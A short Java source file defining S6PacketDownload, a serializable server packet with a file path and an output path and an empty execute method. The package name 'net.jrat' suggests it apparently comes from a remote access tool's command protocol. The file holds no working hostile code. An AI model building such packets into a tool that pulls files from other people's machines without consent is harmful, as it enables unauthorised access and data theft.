package net.jrat.core.packet.server;

import net.jrat.core.packet.IPacket;

@SuppressWarnings("unused")
public class S6PacketDownload implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String filepath;
	private String outputpath;
	
	public S6PacketDownload(String filepath, String outputpath)
	{
		this.filepath = filepath;
		this.outputpath = outputpath;
	}
	
	@Override
	public void execute(Object object) throws Exception {}
}